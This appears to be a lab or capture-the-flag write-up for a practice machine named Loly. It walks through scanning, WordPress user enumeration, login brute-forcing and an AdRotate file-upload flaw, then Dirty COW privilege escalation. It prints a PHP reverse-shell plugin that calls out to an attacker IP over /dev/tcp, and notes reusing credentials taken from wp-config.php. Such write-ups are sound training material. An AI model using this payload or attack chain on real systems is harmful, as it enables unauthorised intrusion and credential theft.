# Loly

## Enumeration&#x20;

### Nmap scan&#x20;

```

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 61 nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 4.11 (96%), Linux 3.13 - 4.4 (96%), Linux 3.8 - 3.16 (96%), Linux 4.4 (96%), Linux 3.2 - 4.14 (96%), Linux 2.6.32 - 3.13 (95%), Linux 2.6.32 - 3.10 (94%), Amazon Fire TV (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.99%E=4%D=11/12%OT=80%CT=%CU=38907%PV=Y%DS=4%DC=T%G=N%TM=6AF5E3FE%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)
SEQ(SP=106%GCD=2%ISR=10D%TI=Z%CI=I%II=I%TS=8)
OPS(O1=M540ST11NW7%O2=M540ST11NW7%O3=M540NNT11NW7%O4=M540ST11NW7%O5=M540ST11NW7%O6=M540ST11)
WIN(W1=6810%W2=6810%W3=6810%W4=6810%W5=6810%W6=6810)
ECN(R=Y%DF=Y%T=40%W=6900%O=M540NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 198.047 days (since Tue Apr 28 10:59:13 2026)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```



### Port 80 - HTTP

Running a directory brute-force scan with ffuf uncovered an accessible /wordpress endpoint

<figure><img src="../.gitbook/assets/image (518).png" alt=""><figcaption></figcaption></figure>

Enumerated the active WordPress version from the page's HTML source code

<figure><img src="../.gitbook/assets/image (519).png" alt=""><figcaption></figcaption></figure>

add the domain address to the /etc/hosts file&#x20;

<figure><img src="../.gitbook/assets/image (520).png" alt=""><figcaption></figcaption></figure>



Enumerated the application using **`/?author=1`**, which revealed **`loly`** as the sole registered user account on the system

<figure><img src="../.gitbook/assets/image (521).png" alt=""><figcaption></figcaption></figure>

Verified that user loly is valid user&#x20;

<figure><img src="../.gitbook/assets/image (522).png" alt=""><figcaption></figcaption></figure>

Intercepted the login request and performed credential brute-forcing, successfully triggering an HTTP `302` redirect on a valid password combination.&#x20;

<figure><img src="../.gitbook/assets/image (523).png" alt=""><figcaption></figcaption></figure>

Navigated to the resulting page, which presented an administrator email verification prompt, just select remind me later and it takes us wordpress dashboard&#x20;

<figure><img src="../.gitbook/assets/image (524).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (525).png" alt=""><figcaption></figcaption></figure>

Identified the application running AdRotate plugin v5.8.6.2, which is vulnerable to an authenticated admin double-extension arbitrary file upload

<figure><img src="../.gitbook/assets/image (526).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (527).png" alt=""><figcaption></figcaption></figure>



#### More about this vulnerability - [https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/adrotate/adrotate-ad-manager-adsense-ads-5132-authenticated-admin-double-extension-arbitrary-file-upload](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/adrotate/adrotate-ad-manager-adsense-ads-5132-authenticated-admin-double-extension-arbitrary-file-upload)



#### CVE - [https://nvd.nist.gov/vuln/detail/cve-2022-1206](https://nvd.nist.gov/vuln/detail/cve-2022-1206)



<figure><img src="../.gitbook/assets/image (528).png" alt=""><figcaption></figcaption></figure>

&#x20;Navigated to the AdRotate media management section and uploaded a crafted reverse shell packaged as a plugin `.zip` file to achieve remote code execution

```
<?php  
/**  
* Plugin Name: Reverse Shell Plugin  
* Description: Simple reverse shell for testing  
* Version: 1.0  
*/  
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.169/80 0>&1'");  
?>
```

<figure><img src="../.gitbook/assets/image (529).png" alt=""><figcaption></figcaption></figure>

upload was successful

<figure><img src="../.gitbook/assets/image (530).png" alt=""><figcaption></figcaption></figure>

Triggering the uploaded php file by visiting this url

```
http://192.168.221.121/wordpress/wp-content/banners/rev.php
```

and got a reverse shell

<figure><img src="../.gitbook/assets/image (531).png" alt=""><figcaption></figcaption></figure>

In wp-config.php file found credentials for the database, which was the password for user loly&#x20;

<figure><img src="../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>

### local.txt

authenticated as loly and able to see that local.txt was present in /var/www directory

<figure><img src="../.gitbook/assets/image (534).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (533).png" alt=""><figcaption></figcaption></figure>



### Privilege Escalation&#x20;

Identified the system running Linux kernel `4.4.0-31-generic`, which is vulnerable to Dirty COW (CVE-2016-5195); successfully leveraged the exploit to escalate privileges to root.

#### PoC exploit for dirtycow - [https://github.com/firefart/dirtycow/tree/master](https://github.com/firefart/dirtycow/tree/master)

<figure><img src="../.gitbook/assets/image (535).png" alt=""><figcaption></figcaption></figure>

Restarted the connection, switched to the root user via `su`, and entered the password to gain full administrative access.

<figure><img src="../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>
